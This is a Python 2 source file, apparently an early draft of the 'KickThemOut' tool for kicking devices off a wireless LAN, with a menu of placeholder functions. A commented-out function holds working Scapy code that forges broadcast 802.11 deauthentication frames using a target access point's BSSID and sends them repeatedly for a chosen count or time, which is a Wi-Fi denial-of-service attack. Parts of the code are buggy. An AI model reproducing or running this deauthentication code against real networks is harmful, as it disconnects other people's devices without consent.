#!/usr/bin/env python
# -.- coding: utf-8 -.-
# kickthemout.py

"""
Copyright (C) 2016 Nikolaos Kamarinakis (nikolaskam@gmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import time, os, sys, logging
from time import sleep

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def heading():
    print(GREEN + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """  + END + BLUE +
    '\n' + '{0}Kick Devices Off Your LAN ({1}KickThemOut{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(88) +
    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(87) +
    '\n' + 'Version: {0}0.1{1}'.format(YELLOW, END).center(77))

def optionBanner():
    print('\nChoose option from menu:\n')
    print('\t{0}[{1}1{2}]{3} Kick ONE Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Kick SOME Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}3{2}]{3} Kick ALL Off').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\n\t{0}[{1}E{2}]{3} Exit KickThemOut\n').format(YELLOW, RED, YELLOW, WHITE)

def kickoneoff():
    print('kickoneoff')

def kicksomeoff():
    print('kicksomeoff')

def kickalloff():
    print('kickalloff')

"""
def deauth_attack(iface, bssid):

    client = 'FF:FF:FF:FF:FF:FF'

    conf.iface = iface
    conf.verb = 0
    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,
    addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)

    print('\nChoose option from menu:\n')
    print('\t{0}[{1}1{2}]{3} Kick Once').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)
    print('\t{0}[{1}2{2}]{3} Keep Kicking').format(YELLOW, RED, YELLOW, WHITE)
    sleep(0.2)

    choice = None
    while choice == None:
        header = ('\n{0}kickthemout{1}> '.format(BLUE, WHITE))
        choice = raw_input(header)
        if choice == '1':
            pcounter_header = ('{0}kickthemout{1}> numofpackets: '.format(BLUE, WHITE))
            pcounter = raw_input(pcounter_header)
            print(pcounter) # {TESTING}
            packets_sent = 0
            for i in range(int(pcounter)):
                sendp(packet)
                packets_sent += 1
            print 'Deauth sent via: ' + iface + ' to BSSID: ' + bssid + '.\nPackets sent: ' + str(packets_sent)
            sleep(2)
        elif choice == '2':
            time_header = ('{0}kickthemout{1}> keepkickingfor(mins): '.format(BLUE, WHITE))
            attack_time = float(raw_input(time_header))
            start = time.time()
            packets_sent = 0
            while (time.time() - start) != attack_time:
                sendp(packet)
                packets_sent += 1
            print 'Deauth sent via: ' + iface + ' to BSSID: ' + bssid + '.\nPackets sent: ' + str(packets_sent)
            sleep(2)
        else:
            choice = None
            print('*INVALID OPTION*') # {TESTING}
"""

def main():

    heading()

    try:
        # CHECK FOR WIRELESS CARD
        iface_header = ('\n{0}kickthemout{1}> interface: '.format(BLUE, WHITE))
        iface = raw_input(iface_header)

        # SCAN (AIRODUMP-NG) & PARSE (BSSIDs)
        # ...

        bssid_header = ('{0}kickthemout{1}> bssid: '.format(BLUE, WHITE))
        bssid = raw_input(bssid_header) # {TESTING}

        while True:

            optionBanner()

            header = ('{0}kickthemout{1}> '.format(BLUE, WHITE))
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('Thanks for dropping by!')
                print('Catch ya later!')
                raise SystemExit
            elif choice == '1':
                kickoneoff()
                # EXECUTE kickoneoff FUNCTION (SCAN & PARSE)
            elif choice == '2':
                kicksomeoff()
                # EXECUTE kicksomeoff FUNCTION
            elif choice == '3':
                kickalloff()
                # EXECUTE kickalloff FUNCTION (FF:FF:FF:FF:FF:FF)
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            #else:
                #print('*INVALID OPTION*')

    except KeyboardInterrupt:
        print('\nThanks for dropping by.'
              '\nCatch ya later!')


if __name__ == '__main__':
    main()
